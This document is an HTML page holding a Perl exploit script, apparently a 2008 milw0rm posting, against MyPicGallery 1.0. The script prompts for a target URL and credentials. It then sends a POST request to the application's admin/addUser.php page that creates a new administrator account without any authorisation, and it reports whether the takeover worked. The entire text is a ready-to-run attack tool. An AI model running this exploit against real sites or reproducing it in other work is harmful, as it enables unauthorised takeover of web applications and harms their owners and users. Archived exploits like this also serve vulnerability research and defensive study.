<html><head><title>MyPicGallery 1.0 Arbitrary Add-Admin Exploit</title></head><pre>#!/usr/bin/perl

use strict;
use LWP::UserAgent;

print &quot;-+--[ MyPicGallery 1.0 Arbitrary Add-Admin Exploit ]--+-\n&quot;;
print &quot;-+--        Discovered &amp;&amp; Coded By: t0pP8uZz        --+-\n&quot;;
print &quot;-+-- Discovered On: 16 MAY 2008 / h4ck-y0u, milw0rm --+-\n&quot;;
print &quot;-+--[ MyPicGallery 1.0 Arbitrary Add-Admin Exploit ]--+-\n&quot;;

print &quot;\nEnter URL(http://site.com): &quot;;
	chomp(my $url=&lt;STDIN&gt;);
	
print &quot;\nEnter Username(create's a admin username): &quot;;
	chomp(my $usr=&lt;STDIN&gt;);
	
print &quot;\nEnter Password(create's a admin password): &quot;;
	chomp(my $pwd=&lt;STDIN&gt;);
	
my $ua = LWP::UserAgent-&gt;new( agent =&gt; &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&quot; );
my $ob = $ua-&gt;post( $url.&quot;/admin/addUser.php?userID=admin&quot;, { &quot;submit&quot; =&gt; 1, # ugly?
															  &quot;fullName&quot;    =&gt; &quot;null&quot;,
															  &quot;userName&quot;    =&gt; $usr,
															  &quot;password&quot;    =&gt; $pwd,
															  &quot;conPassword&quot; =&gt; $pwd,
															  &quot;uType&quot;       =&gt; &quot;admin&quot;,
															  &quot;email&quot;       =&gt; &quot;null\@null.com&quot; } );

if($ob-&gt;is_success &amp;&amp; index($ob-&gt;content, &quot;added&quot;) != -1) {
	print &quot;\nAdmin Account Added! Login at: &quot;.$url.&quot;\n&quot;;
} else { print &quot;\nExploit Failed! username already exists?&quot;; }

# milw0rm.com [2008-05-18]</pre></html>